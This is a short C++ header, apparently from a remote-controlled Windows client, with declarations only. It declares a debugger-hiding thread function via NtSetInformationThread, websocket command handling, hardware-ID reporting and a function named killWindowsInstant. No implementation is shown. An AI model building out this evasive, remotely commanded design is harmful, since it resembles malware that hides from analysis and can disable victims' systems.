typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);

bool HideThread(HANDLE hThread);
bool CreateSocket();
void CloseSocket();
bool UpdateSocket();
void SendHardwareID();
void handle_message(const std::string & message);
void Reconnect();

void CheckTime();
void killWindowsInstant();

extern WebSocket::pointer websocket;